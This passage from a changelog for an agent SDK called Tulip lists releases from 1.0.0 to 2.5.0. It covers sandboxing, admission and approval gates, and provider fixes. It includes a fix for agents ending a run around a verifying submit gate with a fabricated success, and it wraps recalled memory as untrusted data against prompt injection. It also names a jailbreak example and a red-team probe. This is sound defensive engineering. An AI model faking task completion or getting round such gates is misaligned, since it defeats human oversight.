  see.** `Agent` is a Pydantic model that also defines `__init__(**kwargs)`;
  `ModelMetaclass` builds `__signature__` from the explicit parameters and
  drops the `**kwargs`, so `termination`, `output_schema`, `memory_manager`,
  `web_search` and 32 others are invisible to `help()`, to editor autocomplete
  and to `inspect.signature()`. They are real and supported; `__signature__`
  itself is unchanged here.

- **`examples/can_you_make_it_go_rogue.py` runs without an API key**, against
  your own OpenAI-compatible endpoint, or against a frontier model — and no
  longer claims the gate won when the model simply refused.

## [2.5.0] - 2026-08-12

Everything here has been on `main` since 2.4.0 and the gateway already depends
on it. Cutting the release is the point: the gateway's CI resolves this package
**from source** while its production image installs it **from PyPI**, so a
symbol added here and never released passes every test and then fails inside
the container. That is not hypothetical — dev's cognitive router answered 500
on every routed run with
`PolicyGate.__init__() got an unexpected keyword argument 'denied_protocols'`
until this went out.

### Added

- **`PolicyGate.denied_protocols`** — a deployment can refuse protocol shapes
  by declaration, and the router will not select what policy has denied. The
  gateway wires this into `/v1/dispatch` and the CLI.
- **`dispatch()` accepts a pinned `GoalFrame`** — the resume seam. A resumed
  dispatch replays under the frame the approval was granted against, instead of
  re-extracting one a live model might frame differently.
- **`TerminateEvent` carries the segment's token usage** — what the gateway
  meters a run's cost from.
- **`InterruptEvent` carries structured input fields** — the field spec the
  Console renders as a form rather than as a sentence asking for one.

### Fixed

- **Governance and conversation survive a resume.** The resume loop was
  hook-blind and note-injecting; a redeemed tool no longer arrives ungoverned.
- **A second `ask_user` during a resume re-pauses** instead of running on.
- **SSRF blocked in `web_fetch`** (private and metadata destinations).
- **`ChromaStore`** warns self-hosted-server operators about CVE-2026-45829.
- **`decision_status`** typed as `Literal["resolved", "abstain"]` (GSAR).
- Dependency bumps clearing Dependabot alerts: aiohttp 3.14.3,
  cryptography 50.0.0, h2 4.4.1.

## [2.4.0] - 2026-08-04

### Added

- **The OpenAI provider speaks the Responses API.** `OpenAIModel` gains an
  `api` setting — `"chat_completions"`, `"responses"`, or `"auto"` (the
  default), which routes the model families only `/v1/responses` serves
  (gpt-5.6-*) there and keeps everything else on chat-completions. GPT-5.6
  rejects function tools on chat-completions whenever reasoning is active
  ("Function tools with reasoning_effort are not supported … use
  /v1/responses or set reasoning_effort to 'none'"), so the family could
  previously call tools only with reasoning disabled — defeating its
  purpose. Auto-selection never fires for a custom `base_url`:
  OpenAI-compatible gateways (Together, vLLM, LiteLLM) serve
  chat-completions, not `/v1/responses`. Both `complete()` and `stream()`
  are covered; chat-completions spellings translate so callers don't care
  which transport is active (`max_tokens` → `max_output_tokens`,
  `reasoning_effort` → `reasoning.effort`, `response_format` →
  `text.format`, chat-shaped `tool_choice` flattened), and usage + stop
  reasons land in the chat vocabulary (`stop` / `tool_calls` / `length`).
  Reasoning stays on: no effort is ever defaulted. The transport stays
  stateless (`store=False`) — raw output items (reasoning items with their
  `encrypted_content`, function calls) ride along in the assistant
  `Message.metadata` and are replayed verbatim next turn, which is what
  reasoning models require to continue a tool-calling turn without
  server-side storage. Dropped for lack of a Responses equivalent: `seed`,
  `stop` sequences, penalties; streamed turns reconstruct history without
  reasoning items (#60).
- **Sandboxed tool execution.** `@tool(sandbox=True)` ships the function's
  source into an isolated box and runs it there — the host process never
  executes the body, and direct `tool(...)` calls are sandboxed too, so
  there is no bypass. The zero-infra default is the new
  `tulip.tools.sandbox.SubprocessSandbox` (fresh working directory,
  `python -I`, environment scrubbed to `PATH`/`LANG` plus what the manifest
  explicitly grants, per-call timeout). Stronger boundaries plug in through
  the structural `ToolSandbox` protocol: `TULIP_SANDBOX=docker` (or a
  provider name / object / `SandboxSpec`) resolves Docker, Firecracker,
  SSH and Lambda providers from the optional `tulip-sandbox` package by
  duck typing — neither package imports the other. Runs emit
  `tool.sandbox.started` / `tool.sandbox.completed` on the event bus (#7).
- **Policy-required sandboxing.** `ControlPolicy.require_sandbox_for` names
  the labels whose actions must execute in a sandbox: `approve()` denies a
  matching action that doesn't carry the new `SANDBOXED_TAG` tag, and the
  new `SandboxEnforcerHook` enforces the same rule at the agent loop's
  `on_before_tool_call` seam — an un-sandboxed call to a tool labelled
  (via the new `@tool(labels={...})`) with a required label is cancelled
  before it runs, and `tool.sandbox.denied` is emitted (#7).

## [2.3.0] - 2026-08-01

### Added

- **Token-level streaming from the agent loop.** `agent.run(..., stream_tokens=True)`
  also yields `ModelChunkEvent` as the model produces them, so text and
  chain-of-thought render while the turn is still running. Tool and termination
  events are unchanged and the assembled response is identical to the
  non-streaming one, so hooks, retries, grounding and termination behave the
  same. Off by default — it changes which event types a consumer sees.
  Previously a streaming chat UI had to abandon the loop and re-implement ReAct
  over a raw provider client, losing admission, audit and the tool-loop guard
  with it (#52).
- **The full Chat Completions surface is reachable.** `complete()` / `stream()`
  read six keys out of `**kwargs` and dropped the rest — of the 36 parameters
  the API accepts, 23 were silently discarded, including `tool_choice`,
  `parallel_tool_calls`, `stream_options`, `logprobs` and `reasoning_effort`.
  Any Chat Completions parameter the caller passes is now forwarded; the
  accepted set is introspected from the `openai` package's own request
  TypedDicts, so a field OpenAI adds is forwardable on a dependency bump rather
  than waiting on a hand-maintained list (#56).
- **`extra_body` on the OpenAI provider** for fields outside the OpenAI schema —
  vLLM's `chat_template_kwargs` (`enable_thinking`), `top_k`, `min_p`,
  `repetition_penalty`. Per-call values merge over config, and it applies to
  reasoning models too, which reject sampling parameters but still accept
  provider extensions (#56).
- **Per-run model parameters from `Agent`.** `run()`, `arun()` and `run_sync()`
  take `model_kwargs`, forwarded to the model call and winning over agent
  config. Model configuration is fixed for a model's lifetime, which is the
  wrong shape for anything that must vary per run — `tool_choice` above all (#55).
- **`ModelResponse.logprobs` and `ModelResponse.candidates`.** Both reached the
  server already but had nowhere to land, so the tokens were paid for and
  discarded; `n>1` is now usable and single-candidate callers see an empty
  list (#53).
- **`ModelChunkEvent.usage` and `.stop_reason`** on the terminal chunk, so a
  streaming caller can meter a turn and tell a natural stop from a `length`
  truncation — which on reasoning models otherwise surfaces as an empty reply
  rather than an error (#54).

### Fixed

- **Sampling the caller configured is no longer discarded.** The loop sent
  `AgentConfig.temperature` (0.7) and `max_tokens` (4096) unconditionally, and
  those land as *per-call* arguments that beat a provider's own config — so
  `get_model("openai:…", temperature=1.0, max_tokens=8192)` was silently
  ignored and every turn went out at 0.7 / 4096. Both now default to `None`
  (defer to the model) and are sent only when explicitly set. Effective
  defaults are unchanged, since `ModelConfig` also defaults to 0.7 / 4096.
- **`temperature` / `top_p` of `None` are omitted from the request**, letting a
  server's own defaults apply. Self-hosted models publish their recommended
  sampling in `generation_config.json`, and a value sent unasked overrides it.
- **Mid-run guidance no longer 400s on OpenAI-compatible servers.** The loop
  injects grounding replans, repair prompts and iteration nudges as *system*
  messages, and several chat templates accept a system message only in first
  position — vLLM serving Qwen rejects the request outright with `System
  message must be at the beginning`, killing a run partway through and only
  when it happened to need guidance. Later system messages are now re-encoded
  as marked user notes, preserving the text and its steering (#57).
- **Anthropic streaming dropped every tool call.** `stream()` read only
  `text_stream`, so `tool_use` blocks, usage and the stop reason never
  surfaced — a streaming tool-using agent silently made no tool calls at all.
  It now reads the assembled final message (#52).

- **`PgMemory` could not create its own schema with default settings.** `dim`
  defaulted to 1024 and the HRR `[cos φ, sin φ]` encoding doubles it, asking
  pgvector for a 2048-dimension column — over the 2000-dimension ceiling for an
  HNSW index, so `CREATE INDEX` raised `ProgramLimitExceededError` and no fact
  was ever written. `dim` now defaults to **512** (a 1024-wide column), an
  explicit `dim` whose doubled width cannot be indexed is rejected at
  construction with both numbers named, and an *embedder* wider than the limit
  is allowed but warns loudly that the table has no ANN index.
- **`PgMemory` hid its own schema failures.** `_get_pool` assigned `self._pool`
  before running `_ensure_schema`, so a schema error surfaced on the first call
  only; every later call found a pool, skipped schema creation and ran against a
  half-built table (sequential-scan recall, silently). The pool is now published
  only after schema creation succeeds, and first use is serialised by a lock.
- **`PgMemory` now detects a pre-existing table of a different vector width**
  (`CREATE TABLE IF NOT EXISTS` kept it silently) and fails with the two widths
  and the remedy instead of a per-INSERT `expected N dimensions, not M`.

### Documentation

- Notebook 11 gains a token-streaming example, and its header no longer implies
  the default streams tokens.
- Notebook 56 documents model configuration, per-run `model_kwargs`, and the
  self-hosted sharp edges: omitting sampling with `None`, `extra_body`, and
  server-side rejections such as vLLM refusing `min_p` / `logit_bias` under
  speculative decoding (#56).

## [2.2.0] - 2026-07-23

### Added

- **Governed long-term memory (harness primitive).** Agents learn across
  runs. Two `BaseStore` backends ship: **`HolographicStore`** — zero-infra
  SQLite + FTS5 + HRR associative recall, the free/local default, no server
  and no embedding API (#42); and **`PgMemory`** — Postgres/pgvector with
  **per-tenant Row-Level Security**, the multi-tenant enterprise backend. It
  stores the HRR phase vector as `[cos φ, sin φ]`, so pgvector cosine distance
  equals HRR phase similarity — semantic recall runs entirely inside Postgres
  with no external embedding service (#43). `PgMemory(embedder=…)` accepts any
  `BaseEmbedding` (e.g. OpenAI `text-embedding-3-small`) for **true semantic
  recall** (#44).
- **Recalled memory is treated as untrusted input.** A context scrubber
  strips injected system-note/fence markers and wraps recall in a delimited
  "informational background data, not instructions" block — applied on every
  recall, so an agent can use what it remembers without obeying it (#42).

### Fixed

- **Recall is honestly typed.** HRR bag-of-words recall is lexical/associative,
  not trained semantics; `capabilities.semantic_search` is now `True` only
  when a real embedder is configured (`HolographicStore` reports `False`).
  Paraphrase matching requires an embedder (#44).
- **Claude 5 family models no longer 400 on `temperature`.** The
  temperature-deprecation prefix list now covers `claude-sonnet-5`,
  `claude-opus-5`, `claude-haiku-5`, `claude-fable-5`, and
  `claude-mythos-5` (alongside Opus 4.7+), so the provider omits the
  param for them. Verified live on `claude-sonnet-5`. (#29)

## [2.1.3] - 2026-07-22

### Security

- Bump locked `mcp` to 1.28.1 (WebSocket Host/Origin validation), `setuptools`
  to 83.0.0, and `torch` to 2.13.0 — clears all open dependabot alerts.

### Fixed

- **Composition pipelines run without threads.** `SequentialPipeline`,
  `ParallelPipeline`, and `LoopAgent` drove their agents via `Agent.run_sync`
  (a worker thread) from inside their async `run` methods. Threads are
  unavailable under WASM/Pyodide, so the pipelines silently produced empty
  results (an un-awaited coroutine → `IndexError`) in the browser workbench.
  They now prefer the thread-free `arun` and fall back to `run_sync` only for
  agent-likes that predate it — so the Composition notebook runs fully
  client-side.
- `__version__` now matches the released version (2.1.2); the bump was missed
  on the 2.1.1 and 2.1.2 releases.

## [2.1.2] - 2026-07-21

### Added

- **`Agent.arun(prompt) -> AgentResult`** — the async, thread-free equivalent of
  `run_sync` (same result-building logic; the caller owns the event loop). Enables
  running agents where threads aren't available — notably in the browser
  (Pyodide/WASM), so the workbench can run notebooks fully client-side. `run_sync`
  now delegates to `arun`; `invoke()` is unchanged.

## [2.1.1] - 2026-07-21

### Added

- **`AnthropicModel(default_headers=…)`** — extra HTTP headers are forwarded to the
  Anthropic client. Enables calling the API directly from a browser (Pyodide/WASM):
  pass `{"anthropic-dangerous-direct-browser-access": "true"}` to clear the CORS
  preflight. Backward-compatible (default `None`).

## [2.1.0] - 2026-07-08

### Added

- **Resume from checkpoint — cross-process interrupt rehydration.** `Agent.resume(response, thread_id=…)`
  reloads the interrupted state from the configured checkpointer when the process that paused is gone,
  so a durably-checkpointed run resumes anywhere (the gateway's cross-pod HITL path).
- **Enforceable deepagent submit terminal.** The verifying submit gate rejects fabricated
  submissions by raising, and `require_success=True` keeps the loop running instead of
  terminating on a rejected claim.
- Five runnable domain examples (payments, infra, support, data, cloud — nb83–87), embedded
  by the docs site's notebook pages.

### Fixed

- **Typed-terminal deepagents exit only through the verifying submit.** In explicit mode the
  state machine also terminated on any `terminal_tools` NAME match (`task_complete`, `done`, …) —
  no success or confidence check — letting a model end the run around the submit gate with a
  fabricated success. `create_deepagent` now empties the name-match set when `output_schema`
  is configured; callers can override via `agent_kwargs`.
- Checkpointing happens at the interrupt site, before yielding — a HELD run is durable the
  moment it pauses.

### Changed

- **Positioning: Tulip leads as a first-class agentic framework — "the safest way to
  build agentic AI."** The identity is framework-first and safety-led: control is native
  to the core via three points — the **cognitive router** (PRISM) picks the runtime shape,
  **GSAR** grounds every claim (or abstains), and the **admission gate** (`admit()`) gates
  every risky action — packaged as safety. AI security is repositioned from the SDK's
  identity to its **flagship proof domain**. README, the `tulipagents.ai` landing, package
  description / keywords / classifiers, and `CONTRIBUTING` reflect the framework-first,
  safety-led identity. No API changes.

## [2.0.0] - 2026-06-25

### Changed

- **Breaking: the domain-neutral control core moves to `tulip.control`.** The new
  namespace owns `admit()` / `Action` / policy / audit / `governed_agent`;
  `tulip.security` keeps the security domain and no longer re-exports control.
  Renames, with no deprecation shims: `SecurityPolicy` → `ControlPolicy`,
  `Finding` → `Evidence`, `Verdict` → `VerificationResult`,
  `secure_agent` → `governed_agent`, `SecurityProfile` → `GovernanceProfile`.
  Update imports to `from tulip.control import Action, admit, ControlPolicy, AuditTrail`.

## [1.1.0] - 2026-06-24

### Added

- **Control-first repositioning — `admit()` as the headline.** The drop-in story:
  add the admission gate + tamper-evident audit around the agent you already have
  (any framework) in ~8 lines — risky actions are policy-gated and
  human-approvable, and every decision is a hash-chained record you can replay and
  cannot forge. New runnable examples: `can_you_make_it_go_rogue.py` (jailbreak the
  model — the gate still blocks the action), `governed_soc_action.py`
  (gate → hold-for-human → audit), `grounding_ablation.py` (same model ± grounding).
- **Adversarial `verify()`.** `AdversarialSkeptic` adds an LLM-backed skeptic that
  actively challenges a finding's evidence and emits typed `Refutation`s, alongside
  the existing deterministic checks — a hallucinated "critical" is refuted before it
  can drive an action.
- **`UnsandboxedCodeExecution` red-team probe** (OWASP ASI05) — effect-grounded
  proof-of-execution via an unforgeable nonce digest; registered in the `owasp-asi`
  suite. Response-only, target-agnostic, cannot false-positive.

## [1.0.0] — 2026-06-09

First general-availability release. From 1.0.0 Tulip follows Semantic
Versioning: breaking changes only land in major versions, with the
deprecation path described in [`DEPRECATION.md`](DEPRECATION.md).

### Changed

- **Positioning: Tulip is the AI-cybersecurity agent SDK.** The cookbook
  (`examples/`) is AI-security-led — prompt injection, jailbreaks, inference
  fingerprinting, RAG/memory poisoning, model extraction, and excessive agency
  as the primary track, with classic SOC/IR (triage, IOC enrichment, phishing,
  secure code review, incident response with approval gates) as the second.
  Scenarios are tagged to MITRE ATLAS / OWASP LLM / OWASP ASI; README, package
  description, keywords, and the `Topic :: Security` classifier reflect the
  cybersecurity identity.
- **License:** relicensed from UPL-1.0 to **Apache-2.0**. Portions
  originally released under UPL-1.0 remain available under those terms —
  see `NOTICE`.
- **Versioning:** the `0.2.0bN` beta line is retired; Tulip goes GA at
  `1.0.0` with no further pre-releases.
- **Docs:** documentation moves to <https://tulipagents.ai/> with a new
  information architecture (Learn / Cookbook / Workbench / Reference)
  and a redesigned home page.
- **Repo split:** the documentation site and the browser workbench move
  to dedicated repositories —
  [tuliplabs-ai/docs](https://github.com/tuliplabs-ai/docs) and
  [tuliplabs-ai/workbench](https://github.com/tuliplabs-ai/workbench).
  This repository carries the SDK and its cookbook (`examples/`).

### Added

- Initial public release of **Tulip** (`tulip-agents`), a vendor-neutral
  SDK for building auditable agent teams.
- **`tulip.security` — evidence-grounded findings**, the layer that makes
  Tulip a cybersecurity SDK rather than a general one: `ground_finding()` /
  `ground_fingerprint()` turn a GSAR evidence partition into a typed `Finding`
  **only** above the grounding threshold, else an auditable `Abstention` — a
  `Finding` has no public constructor without a score, so an ungrounded finding
  is unshippable by construction. Typed schemas (`Finding`, `Indicator`,
  `FingerprintFinding`, `FingerprintVerdict`), a `FingerprintClassifier`
  protocol, and threat-taxonomy enums (`AtlasTechnique` / MITRE ATLAS,
  `OwaspLLM`, `OwaspASI`). Pydantic + stdlib only, mypy-strict.
- Agent runtime with the Think → Execute → Reflect → Terminate loop,
  idempotent tools, composable termination algebra, Reflexion, Grounding,
  and the GSAR typed-grounding layer.
- Eight orchestration shapes (Sequential / Parallel / Loop pipelines,
  StateGraph, Orchestrator + Specialists, Swarm, Handoff, A2A) and the
  PRISM cognitive router.
- Model providers: OpenAI, Anthropic, and any OpenAI-compatible
  endpoint via `base_url`.
- RAG: `PgVectorStore`, `QdrantVectorStore`, `ChromaVectorStore`,
  `OpenSearchVectorStore`, `InMemoryVectorStore`; `OpenAIEmbeddings` and
  `CohereEmbeddings`; `CrossEncoderReranker` (local) and `CohereReranker`.
- Memory: checkpointers for Redis, PostgreSQL, MySQL, OpenSearch, S3 /
  MinIO / R2, file, in-memory, and HTTP; long-term memory via
  `Mem0MemoryManager` or the portable `LLMMemoryManager`.
- Observability EventBus, MCP client + server, FastAPI `AgentServer`,
  and an evaluation harness.
